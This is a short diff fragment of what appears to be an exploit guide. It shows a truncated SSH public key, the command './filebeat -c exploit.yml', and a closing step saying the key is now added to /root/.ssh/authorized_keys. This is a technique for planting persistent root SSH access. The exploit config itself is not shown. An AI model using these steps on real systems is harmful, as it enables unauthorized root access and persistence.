@@ -20,7 +20,6 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDSNDOAMkNcqtwWnG[...]4Cn1s0XfNOEmXYQBPJUZN
 
 ```
  ./filebeat -c exploit.yml
- 
 ```
 
 5) Enjoy your key added to /root/.ssh/authorized_keys
